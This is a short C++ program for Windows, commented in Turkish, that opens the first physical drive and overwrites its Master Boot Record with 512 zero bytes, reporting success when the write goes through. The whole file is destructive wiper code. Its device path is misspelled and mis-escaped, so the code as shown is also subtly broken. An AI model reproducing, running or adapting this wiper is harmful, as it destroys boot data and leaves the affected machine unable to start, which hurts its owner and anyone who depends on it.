#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512

int main()
{
	DWORD write;
	char mbrData[MBR_SIZE]; 
	ZeroMemory(&mbrData,(sizeof mbrData)); //Destination,Length //ZeroMemory belirtilen alaný belirtilen boyutta temizler
										  
    //Handle Windows nesneleri için bir çeþit iþaretçidir
	//CreateFile dosya oluþturur yada var olan dosya üzerinde iþlem yapar
	HANDLE MasterBootRecord = CreateFile("\\\\.\PyhsicalDriver0",//Dosyanýn adý
		GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,//Dosyanýn açýlma izinlerinin hepsi verildi ve Dosyanýn paylaþým modlarý read ve write
		NULL,OPEN_EXISTING,NULL,NULL); //Dosyanýn durumu
	
	//WriteFile: Verileri belirtilen dosya veya giriþ / çýkýþ(G / Ç) aygýta yazar.
	//Parametreler:dosya adý,verileri içeren ara bellek,boyut,yazýlan bayt numarasýný alýr,çakýþma durumu
	if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE)
	{
		cout << "Master Boot Record is over written !" << endl;
		Sleep(5000);
		ExitProcess(0);
	}
	else
	{
		cout << "Fail " ;
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;

}

